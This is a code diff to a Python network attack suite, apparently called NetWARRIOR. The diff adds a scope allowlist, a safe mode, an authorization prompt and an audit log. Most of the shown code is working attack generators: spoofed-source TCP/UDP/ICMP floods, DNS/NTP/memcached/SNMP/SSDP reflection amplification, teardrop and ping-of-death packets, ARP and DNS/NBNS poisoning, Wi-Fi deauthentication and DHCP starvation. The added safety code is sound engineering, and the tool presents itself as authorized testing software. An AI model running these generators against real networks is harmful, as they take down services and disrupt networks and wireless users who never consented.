@@ -4,6 +4,9 @@ import time
 import socket
 import random
 import re
+import json
+import getpass
+import argparse
 import threading
 import queue
 import shlex
@@ -184,23 +187,41 @@ def _config_path() -> Path:
     return Path(base) / "netwarrior" / "config.toml"
 
 
+def _as_bool(v) -> bool:
+    if isinstance(v, str):
+        return v.strip().lower() in ("1", "true", "yes", "on")
+    return bool(v)
+
+
+def _as_strlist(v) -> list:
+    if isinstance(v, str):
+        return [s.strip() for s in v.replace(",", " ").split() if s.strip()]
+    return [str(s) for s in v]
+
+
 class Config:
     # name -> (coercion callable, default)
     _FIELDS = {
-        "max_pps":          (int,   10000),
-        "safe_mode":        (bool,  False),
-        "default_duration": (int,   30),
-        "interface":        (str,   None),
-        "output_dir":       (Path,  Path("reports")),
-        "log_level":        (str,   "INFO"),
-        "dns_servers":      (list,  ["8.8.8.8", "1.1.1.1"]),
-        "ssh_timeout":      (float, 5.0),
-        "http_timeout":     (float, 10.0),
+        "max_pps":          (int,        10000),
+        "safe_mode":        (_as_bool,   False),
+        "default_duration": (int,        30),
+        "interface":        (str,        None),
+        "output_dir":       (Path,       Path("reports")),
+        "log_level":        (str,        "INFO"),
+        "dns_servers":      (_as_strlist, ["8.8.8.8", "1.1.1.1"]),
+        "ssh_timeout":      (float,      5.0),
+        "http_timeout":     (float,      10.0),
+        # ── safety / accountability ──────────────────────────────────────────
+        "scope":            (_as_strlist, []),      # CIDRs; empty = unrestricted
+        "spoof_source":     (_as_bool,   True),     # forced off while safe_mode
+        "require_ack":      (_as_bool,   True),     # first-run authorization prompt
+        "authorized":       (_as_bool,   False),    # set once the operator acknowledges
+        "audit_log":        (_as_bool,   True),     # append every attack launch to audit.log
     }
 
     def __init__(self):
         for name, (_, default) in self._FIELDS.items():
-            setattr(self, name, default)
+            setattr(self, name, list(default) if isinstance(default, list) else default)
         self._path = _config_path()
         self.load()
 
@@ -234,7 +255,7 @@ class Config:
         with open(self._path, "wb") as f:
             tomli_w.dump(data, f)
 
-    # ── Safety guard ──────────────────────────────────────────────────────────
+    # ── Safety guards ─────────────────────────────────────────────────────────
     def clamp_pps(self, pps: int) -> int:
         try:
             pps = int(pps)
@@ -242,23 +263,58 @@ class Config:
             pps = 1000
         return max(1, min(pps, self.max_pps))
 
+    @property
+    def effective_spoof(self) -> bool:
+        """Source-address spoofing is force-disabled while safe_mode is on."""
+        return bool(self.spoof_source) and not self.safe_mode
+
+    def _scope_networks(self):
+        nets = []
+        for c in self.scope:
+            try:
+                nets.append(ipaddress.ip_network(c, strict=False))
+            except ValueError:
+                pass
+        return nets
+
     def check_target(self, target: str) -> Optional[str]:
-        """Return a rejection reason when safe_mode forbids this target, else None."""
-        if not self.safe_mode:
-            return None
+        """
+        Return a rejection reason (str) if this target is not allowed, else None.
+        Enforces the scope allowlist always, and the reserved-address blocks
+        while safe_mode is on. Literal IPs and resolvable hostnames are checked;
+        an unresolvable hostname is rejected only when a scope is configured.
+        """
         host = (target or "").strip()
+        if not host:
+            return None
+
+        ips = []
         try:
-            ip = ipaddress.ip_address(host)
+            ips = [ipaddress.ip_address(host)]
         except ValueError:
-            return None  # hostnames are not resolved here; only literal IPs are gated
-        if ip.is_loopback:
-            return "safe_mode: refusing to target loopback"
-        if ip.is_multicast:
-            return "safe_mode: refusing to target a multicast address"
-        if ip.is_unspecified or ip.is_reserved:
-            return "safe_mode: refusing to target a reserved address"
-        if ip.version == 4 and ip.packed[-1] in (0, 255):
-            return "safe_mode: refusing to target a network/broadcast address"
+            if self.scope:  # a scope means we must know where packets are going
+                try:
+                    infos = socket.getaddrinfo(host, None)
+                    ips = [ipaddress.ip_address(i[4][0]) for i in infos]
+                except (socket.gaierror, ValueError):
+                    return f"cannot resolve {host!r} to check it against the scope"
+
+        nets = self._scope_networks()
+        if nets:
+            for ip in ips:
+                if not any(ip in n for n in nets):
+                    return f"out of scope: {ip} is not in {', '.join(map(str, nets))}"
+
+        if self.safe_mode:
+            for ip in ips:
+                if ip.is_loopback:
+                    return "safe_mode: refusing to target loopback"
+                if ip.is_multicast:
+                    return "safe_mode: refusing to target a multicast address"
+                if ip.is_unspecified or ip.is_reserved:
+                    return "safe_mode: refusing to target a reserved address"
+                if ip.version == 4 and ip.packed[-1] in (0, 255):
+                    return "safe_mode: refusing to target a network/broadcast address"
         return None
 
 class NetworkContext:
@@ -407,6 +463,40 @@ class LogBus:
         with self._lock:
             return list(self.logs)[-n:]
 
+
+class AuditLog:
+    """
+    Append-only record of every offensive action taken, for engagement paperwork.
+    One JSON object per line in ``<output_dir>/audit.log``.
+    """
+    def __init__(self, config: "Config"):
+        self.config = config
+        self._lock = threading.Lock()
+        try:
+            self.operator = getpass.getuser()
+        except Exception:
+            self.operator = "unknown"
+
+    def record(self, action: str, **fields):
+        if not self.config.audit_log:
+            return
+        entry = {
+            "ts": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"),
+            "operator": self.operator,
+            "action": action,
+            **{k: v for k, v in fields.items() if v not in (None, "")},
+        }
+        line = json.dumps(entry, default=str)
+        try:
+            with self._lock:
+                path = self.config.output_dir / "audit.log"
+                path.parent.mkdir(parents=True, exist_ok=True)
+                with open(path, "a", encoding="utf-8") as f:
+                    f.write(line + "\n")
+        except Exception:
+            pass
+
+
 # ──────────────────────────────────────────────────────────────────────────────
 # ENGINE
 # ──────────────────────────────────────────────────────────────────────────────
@@ -461,23 +551,50 @@ class AttackEngine:
     def _resolve_iface(self, iface: Optional[str]) -> Optional[str]:
         return iface or self.config.interface or None
 
+    def _despoof(self, pkt):
+        """Rewrite a forged source address back to this host's real address."""
+        try:
+            if pkt.haslayer(Ether) and self.net.mac not in (None, "00:00:00:00:00:00"):
+                pkt[Ether].src = self.net.mac
+            if pkt.haslayer(IP):
+                pkt[IP].src = self.net.ip
+                pkt[IP].chksum = None
+                for layer in (TCP, UDP):
+                    if pkt.haslayer(layer):
+                        pkt[layer].chksum = None
+        except Exception:
+            pass
+        return pkt
+
     async def send_loop(self, packet_gen: Iterable, duration: float, pps: int,
-                        attack_name: str, layer2: bool = False,
+                        att: "AttackState", layer2: bool = False,
                         iface: Optional[str] = None):
         """
         Pull packets from `packet_gen` and transmit them at `pps` for `duration`
         seconds. Transmission is dispatched to a worker thread in small batches so
         the asyncio event loop (and therefore the UI and the stop command) stays
         responsive even at high packet rates.
+
+        `att` is the AttackState returned by ``registry.create()`` — passed by
+        reference so a de-duplicated name can never point the loop at a stale run.
         """
+        if att is None:
+            return
+        # accept a bare name too, for older call sites
+        if isinstance(att, str):
+            att = self.registry.get(att)
+            if att is None:
+                return
+        attack_name = att.name
         pps = self.config.clamp_pps(pps)
         limiter = RateLimiter(pps)
         loop = asyncio.get_running_loop()
         deadline = loop.time() + max(0, duration)
-        att = self.registry.get(attack_name)
-        if att is None:
-            return
         iface = self._resolve_iface(iface)
+        despoof = not self.config.effective_spoof
+        if despoof:
+            self.log.add(f"{attack_name}: safe_mode/spoof_source off — "
+                         f"sending from {self.net.ip}", tag="SAFE")
         # ~20 executor hand-offs per second keeps the loop responsive.
         batch_size = max(1, min(int(pps // 20) or 1, 512))
         gen = iter(packet_gen)
@@ -504,7 +621,7 @@ class AttackEngine:
                 stop = False
                 for _ in range(batch_size):
                     try:
-                        batch.append(next(gen))
+                        pkt = next(gen)
                     except StopIteration:
                         stop = True
                         break
@@ -515,6 +632,7 @@ class AttackEngine:
                         att.inc_errors()
                         stop = True
                         break
+                    batch.append(self._despoof(pkt) if despoof else pkt)
                 if batch:
                     await limiter.acquire(len(batch))
                     try:
@@ -553,7 +671,7 @@ class Attacks:
                     sport=Utils.rand_port(), dport=port, flags="S",
                     seq=random.randint(0,4294967295), window=random.randint(1024,65535)
                 )
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def udp_flood(self, target, port=80, duration=30, pps=1000, size=512, **kwargs):
@@ -563,7 +681,7 @@ class Attacks:
         def gen():
             while True:
                 yield IP(src=Utils.rand_ip(), dst=target) / UDP(sport=Utils.rand_port(), dport=port) / Utils.rand_payload(size)
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def icmp_flood(self, target, duration=30, pps=1000, **kwargs):
@@ -573,7 +691,7 @@ class Attacks:
         def gen():
             while True:
                 yield IP(src=Utils.rand_ip(), dst=target) / ICMP() / Utils.rand_payload(56)
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def tcp_ack_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
@@ -586,7 +704,7 @@ class Attacks:
                     sport=Utils.rand_port(), dport=port, flags="A",
                     seq=random.randint(0,4294967295), ack=random.randint(0,4294967295)
                 )
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def tcp_rst_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
@@ -599,7 +717,7 @@ class Attacks:
                     sport=Utils.rand_port(), dport=port, flags="R",
                     seq=random.randint(0,4294967295)
                 )
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def tcp_xmas_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
@@ -612,7 +730,7 @@ class Attacks:
                     sport=Utils.rand_port(), dport=port, flags="FPU",
                     seq=random.randint(0,4294967295)
                 )
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def tcp_null_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
@@ -625,7 +743,7 @@ class Attacks:
                     sport=Utils.rand_port(), dport=port, flags=0,
                     seq=random.randint(0,4294967295)
                 )
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def tcp_fin_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
@@ -638,7 +756,7 @@ class Attacks:
                     sport=Utils.rand_port(), dport=port, flags="F",
                     seq=random.randint(0,4294967295)
                 )
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def tcp_zero_window(self, target, port=80, duration=30, pps=1000, **kwargs):
@@ -651,7 +769,7 @@ class Attacks:
                     sport=Utils.rand_port(), dport=port, flags="A", window=0,
                     seq=random.randint(0,4294967295)
                 )
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def mac_flood(self, target, duration=30, pps=1000, **kwargs):
@@ -662,7 +780,7 @@ class Attacks:
             while True:
                 yield Ether(src=Utils.rand_mac(), dst="ff:ff:ff:ff:ff:ff") / \
                       IP(src=Utils.rand_ip(), dst=target) / TCP(sport=Utils.rand_port(), dport=Utils.rand_port())
-        await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
+        await self.engine.send_loop(gen(), duration, pps, att, layer2=True)
         return att
 
     async def smurf(self, target, broadcast=None, duration=30, pps=1000, **kwargs):
@@ -678,7 +796,7 @@ class Attacks:
         def gen():
             while True:
                 yield IP(src=target, dst=broadcast) / ICMP() / Utils.rand_payload(56)
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def land(self, target, port=80, duration=30, pps=1000, **kwargs):
@@ -691,7 +809,7 @@ class Attacks:
                     sport=port, dport=port, flags="S",
                     seq=random.randint(0,4294967295)
                 )
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def sctp_init_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
@@ -705,7 +823,7 @@ class Attacks:
                 ) / SCTPChunkInit(init_tag=random.randint(1, 0xFFFFFFFF), a_rwnd=65535,
                                   n_out_streams=10, n_in_streams=10,
                                   init_tsn=random.randint(0, 0xFFFFFFFF))
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def teardrop(self, target, duration=30, pps=100, **kwargs):
@@ -718,7 +836,7 @@ class Attacks:
                 pkt = ip / Utils.rand_payload(2000)
                 # fragsize must be a multiple of 8 or scapy emits malformed offsets
                 yield from fragment(pkt, fragsize=488)
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def ping_of_death(self, target, duration=30, pps=100, **kwargs):
@@ -733,7 +851,7 @@ class Attacks:
                 pkt = IP(src=Utils.rand_ip(), dst=target, id=random.randint(1, 65535)) / \
                       ICMP() / Utils.rand_payload(65507)
                 yield from fragment(pkt, fragsize=1480)
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     # ---- Amplification ----
@@ -751,7 +869,7 @@ class Attacks:
                 server = random.choice(servers)
                 q = random.choice(queries)
                 yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=53) / Raw(q)
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def ntp_amp(self, target, duration=30, pps=500, **kwargs):
@@ -764,7 +882,7 @@ class Attacks:
             while True:
                 server = random.choice(servers)
                 yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=123) / Raw(ntp_payload)
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def snmp_amp(self, target, duration=30, pps=500, **kwargs):
@@ -777,7 +895,7 @@ class Attacks:
             while True:
                 server = random.choice(servers)
                 yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=161) / Raw(snmp_payload)
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def memcached_amp(self, target, duration=30, pps=500, **kwargs):
@@ -790,7 +908,7 @@ class Attacks:
             while True:
                 server = random.choice(servers)
                 yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=11211) / Raw(payload)
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def ssdp_amp(self, target, duration=30, pps=500, **kwargs):
@@ -801,7 +919,7 @@ class Attacks:
         def gen():
             while True:
                 yield IP(src=target, dst="239.255.255.250") / UDP(sport=Utils.rand_port(), dport=1900) / Raw(ssdp)
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def chargen_amp(self, target, duration=30, pps=500, **kwargs):
@@ -813,7 +931,7 @@ class Attacks:
             while True:
                 server = random.choice(servers)
                 yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=19) / Raw(b"X")
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def ssdp_discovery(self, duration=30, **kwargs):
@@ -824,7 +942,7 @@ class Attacks:
         def gen():
             while True:
                 yield IP(dst="239.255.255.250") / UDP(sport=1900, dport=1900) / Raw(ssdp)
-        await self.engine.send_loop(gen(), duration, 10, name)
+        await self.engine.send_loop(gen(), duration, 10, att)
         return att
 
     async def radius_pod(self, duration=30, **kwargs):
@@ -835,7 +953,7 @@ class Attacks:
         def gen():
             while True:
                 yield IP(src=Utils.rand_ip(), dst="255.255.255.255") / UDP(sport=Utils.rand_port(), dport=3799) / Raw(payload)
-        await self.engine.send_loop(gen(), duration, 10, name)
+        await self.engine.send_loop(gen(), duration, 10, att)
         return att
 
     # ---- Layer 2 ----
@@ -861,7 +979,7 @@ class Attacks:
                 pkt2 = Ether(dst=gw_mac, src=self.net.mac) / ARP(op=2, pdst=gateway, hwdst=gw_mac, psrc=target, hwsrc=self.net.mac)
                 yield pkt1
                 yield pkt2
-        await self.engine.send_loop(gen(), duration, 10, name, layer2=True)
+        await self.engine.send_loop(gen(), duration, 10, att, layer2=True)
         return att
 
     async def vlan_double_tag(self, target, target_vlan=10, native_vlan=1,
@@ -877,7 +995,7 @@ class Attacks:
                        IP(src=self.net.ip, dst=target) /
                        TCP(sport=Utils.rand_port(), dport=80, flags="S",
                            seq=random.randint(0, 4294967295)))
-        await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
+        await self.engine.send_loop(gen(), duration, pps, att, layer2=True)
         return att
 
     async def l2_protocol_flood(self, proto_type, duration=30, pps=1000, **kwargs):
@@ -895,7 +1013,7 @@ class Attacks:
                     yield Ether(dst="01:80:c2:00:00:00") / LLC(dsap=0x42, ssap=0x42, ctrl=3) / Raw(stp)
                 else:
                     break
-        await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
+        await self.engine.send_loop(gen(), duration, pps, att, layer2=True)
         return att
 
     # ---- IPv6 ----
@@ -910,7 +1028,7 @@ class Attacks:
                 yield (IPv6(dst="ff02::1") /
                        ICMPv6ND_RA(M=1, O=1, routerlifetime=9000, retranstimer=1000) /
                        ICMPv6NDOptSrcLLAddr(lladdr=Utils.rand_mac()))
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def ipv6_na_flood(self, target, duration=30, pps=1000, **kwargs):
@@ -920,7 +1038,7 @@ class Attacks:
         def gen():
             while True:
                 yield IPv6(dst=target) / ICMPv6ND_NA(R=1, S=1, O=1, tgt=Utils.rand_ipv6()) / ICMPv6NDOptSrcLLAddr(lladdr=Utils.rand_mac())
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     async def ipv6_ns_flood(self, target, duration=30, pps=1000, **kwargs):
@@ -930,7 +1048,7 @@ class Attacks:
         def gen():
             while True:
                 yield IPv6(dst=target) / ICMPv6ND_NS(tgt=Utils.rand_ipv6()) / ICMPv6NDOptSrcLLAddr(lladdr=Utils.rand_mac())
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     # ---- Wireless ----
@@ -943,7 +1061,7 @@ class Attacks:
                 # deauth from AP to client, and from client to AP
                 yield RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
                 yield RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth(reason=7)
-        await self.engine.send_loop(gen(), duration, pps, name, layer2=True, iface=iface)
+        await self.engine.send_loop(gen(), duration, pps, att, layer2=True, iface=iface)
         return att
 
     async def beacon_flood(self, ssids=None, iface="wlan0mon", duration=30, pps=100, **kwargs):
@@ -956,7 +1074,7 @@ class Attacks:
             while True:
                 for ssid in ssids:
                     yield RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=Utils.rand_mac(), addr3=Utils.rand_mac()) / Dot11Beacon(cap="ESS") / Dot11Elt(ID="SSID", info=ssid.encode())
-        await self.engine.send_loop(gen(), duration, pps, name, layer2=True, iface=iface)
+        await self.engine.send_loop(gen(), duration, pps, att, layer2=True, iface=iface)
         return att
 
     # ---- GRE ----
@@ -967,7 +1085,7 @@ class Attacks:
         def gen():
             while True:
                 yield IP(src=Utils.rand_ip(), dst=target) / GRE(proto=0x0800) / IP(src=Utils.rand_ip(), dst=target) / Utils.rand_payload(payload_size)
-        await self.engine.send_loop(gen(), duration, pps, name)
+        await self.engine.send_loop(gen(), duration, pps, att)
         return att
 
     # ---- PCAP replay ----
@@ -989,7 +1107,7 @@ class Attacks:
                 while True:
                     for pkt in packets:
                         yield pkt
-            await self.engine.send_loop(gen(), duration, pps, name)
+            await self.engine.send_loop(gen(), duration, pps, att)
         except Exception as e:
             self.log.add(f"Replay error: {e}", level="error")
             att.stop()
@@ -1214,7 +1332,7 @@ class Attacks:
                     qd=DNSQR(qname=domain),
                     an=DNSRR(rrname=domain, rdata=target, ttl=60)
                 )
-        await self.engine.send_loop(gen(), duration, 10, att_name)
+        await self.engine.send_loop(gen(), duration, 10, att)
         return att
 
     async def nbns_poison(self, target, name="WPAD", duration=30, **kwargs):
@@ -1227,7 +1345,7 @@ class Attacks:
                           name.ljust(16).encode() + b"\x00" + b"\x00\x20\x00\x01" + \
                           socket.inet_aton(target)
                 yield IP(src=target, dst="255.255.255.255") / UDP(sport=137, dport=137) / Raw(payload)
-        await self.engine.send_loop(gen(), duration, 10, att_name)
+        await self.engine.send_loop(gen(), duration, 10, att)
         return att
 
     async def mdns_poison(self, target, domain="_http._tcp.local", duration=30, **kwargs):
@@ -1241,7 +1359,7 @@ class Attacks:
                     qd=DNSQR(qname=domain),
                     an=DNSRR(rrname=domain, rdata=target)
                 )
-        await self.engine.send_loop(gen(), duration, 10, att_name)
+        await self.engine.send_loop(gen(), duration, 10, att)
         return att
 
     # ---- DHCP Starvation ----
@@ -1258,7 +1376,7 @@ class Attacks:
                        UDP(sport=68, dport=67) /
                        BOOTP(chaddr=hw, xid=random.randint(1, 0xFFFFFFFF), flags=0x8000) /
                        DHCP(options=[("message-type", "discover"), "end"]))
-        await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
+        await self.engine.send_loop(gen(), duration, pps, att, layer2=True)
         return att
 
     # ---- Social Engineering ----
@@ -2445,12 +2563,14 @@ class UI:
         registry: AttackRegistry,
         log: LogBus,
         engine: AttackEngine,
+        audit: "Optional[AuditLog]" = None,
     ):
         self.config   = config
         self.net      = net
         self.registry = registry
         self.log      = log
         self.engine   = engine
+        self.audit    = audit or AuditLog(config)
         self.attacks  = Attacks(engine, registry, log, net)
         self.recon    = Recon(config, net, log)
         self.pentest  = Pentest(config, log)
@@ -3078,6 +3198,14 @@ class UI:
             cap_con.print(table)
             return cap.getvalue()
 
+        # record intrusive commands for the engagement audit trail (never secrets)
+        if command == "sshexec" and len(args) >= 3:
+            self.audit.record("sshexec", target=args[0], user=args[1],
+                              command=" ".join(args[3:]) or "id")
+        elif command in ("sshbrute", "ftpbrute", "httpbasic", "sql", "xss",
+                         "lfi", "ssrf", "cmdinj", "zone") and args:
+            self.audit.record(command, target=args[0], args=" ".join(args[1:]))
+
         output = ""
         try:
             if command == "help":
@@ -3265,12 +3393,17 @@ class UI:
                             output = f"[red]Attack '{atype}' requires a target[/]"
                         elif reason:
                             coro.close()
+                            self.audit.record("attack.blocked", type=atype, target=target, reason=reason)
                             output = f"[red]{reason}[/]"
                         else:
                             self._spawn_attack(coro)
+                            self.audit.record("attack", type=atype, target=target,
+                                              port=port, duration=duration, pps=pps,
+                                              spoof=self.config.effective_spoof)
                             tgt = f" on {target}" if target else ""
+                            note = "" if self.config.effective_spoof else "  [real source addr]"
                             output = (f"[green]Attack '{atype}' launched{tgt} "
-                                      f"(duration {duration}s, {pps} pps). Type 'stop' to end it.[/]")
+                                      f"(duration {duration}s, {pps} pps){note}. Type 'stop' to end it.[/]")
             elif command == "list":
                 active = self.registry.active()
                 output = (
@@ -3343,19 +3476,97 @@ class UI:
 # ──────────────────────────────────────────────────────────────────────────────
 # MAIN
 # ──────────────────────────────────────────────────────────────────────────────
-async def main():
+__version__ = "0.3.0"
+
+_ACK_PHRASE = "I HAVE AUTHORIZATION"
+_ACK_NOTICE = """\
+NetWARRIOR sends live attack traffic. Running it against systems you do not own
+or have explicit written permission to test is illegal (CFAA, Computer Misuse
+Act, EU Directive 2013/40, and equivalents). See DISCLAIMER.md.
+"""
+
+
+def _parse_args(argv=None) -> argparse.Namespace:
+    p = argparse.ArgumentParser(
+        prog="netwarrior",
+        description="Async network security testing suite (authorized use only).")
+    p.add_argument("--version", action="version", version=f"NetWARRIOR {__version__}")
+    p.add_argument("-y", "--yes", action="store_true",
+                   help="skip the first-run authorization prompt (for automation)")
+    p.add_argument("--safe", action="store_true",
+                   help="force safe_mode for this run (no spoofed source, block reserved IPs)")
+    p.add_argument("--scope", action="append", metavar="CIDR", default=[],
+                   help="restrict every target to this CIDR (repeatable)")
+    p.add_argument("--iface", metavar="NAME", help="network interface for packet injection")
+    p.add_argument("--no-audit", action="store_true", help="do not write audit.log")
+    return p.parse_args(argv)
+
+
+def _authorize(config: Config, assume_yes: bool) -> bool:
+    if config.authorized or not config.require_ack:
+        return True
+    if assume_yes:
+        config.authorized = True
+        _safe_save(config)
+        return True
+    if not sys.stdin.isatty():
+        console.print("[red]First run needs interactive authorization; "
+                      "re-run in a terminal or pass --yes.[/]")
+        return False
+    console.print(f"[yellow]{_ACK_NOTICE}[/]")
+    try:
+        resp = input(f'Type "{_ACK_PHRASE}" to continue: ')
+    except EOFError:
+        return False
+    if resp.strip() != _ACK_PHRASE:
+        console.print("[red]Not acknowledged — exiting.[/]")
+        return False
+    config.authorized = True
+    _safe_save(config)
+    return True
+
+
+def _safe_save(config: Config) -> None:
+    try:
+        config.save()
+    except Exception as e:
+        console.print(f"[yellow]Could not persist config: {e}[/]")
+
+
+async def main(argv=None):
+    args = _parse_args(argv)
     config = Config()
+    if args.safe:
+        config.safe_mode = True
+    if args.scope:
+        config.scope = list(args.scope)
+    if args.iface:
+        config.interface = args.iface
+    if args.no_audit:
+        config.audit_log = False
+
+    if not _authorize(config, args.yes):
+        return
+
     net = NetworkContext()
     registry = AttackRegistry()
     log = LogBus()
+    audit = AuditLog(config)
+    audit.record("session.start", version=__version__, safe_mode=config.safe_mode,
+                 scope=config.scope or None, interface=config.interface)
     engine = AttackEngine(config, registry, log, net)
-    ui = UI(config, net, registry, log, engine)
+    ui = UI(config, net, registry, log, engine, audit)
+    if config.safe_mode:
+        log.add("safe_mode ON — spoofing disabled, reserved targets blocked", tag="SAFE")
+    if config.scope:
+        log.add(f"scope: {', '.join(config.scope)}", tag="SAFE")
     try:
         await ui.run()
     except (KeyboardInterrupt, asyncio.CancelledError):
         console.print("\n[yellow]Interrupted[/]")
         await ui._shutdown()
     finally:
+        audit.record("session.end", packets=registry.total_packets())
         console.print("[green]Goodbye.[/]")
 
 
